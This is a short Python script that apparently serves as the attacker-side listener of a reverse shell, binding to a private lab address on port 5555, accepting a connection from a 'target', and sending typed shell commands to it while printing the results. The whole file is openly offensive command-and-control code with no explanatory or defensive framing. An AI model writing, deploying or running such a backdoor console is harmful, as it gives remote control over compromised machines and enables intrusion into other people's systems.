import json
import socket

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == "quit":
            break
        result = reliable_recieve()
        print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("10.0.2.15", 5555))
print("Listening for incoming connections")
sock.listen(5)
target, ip = sock.accept()
print("[+] Target connected from: ", str(ip))

target_communication()

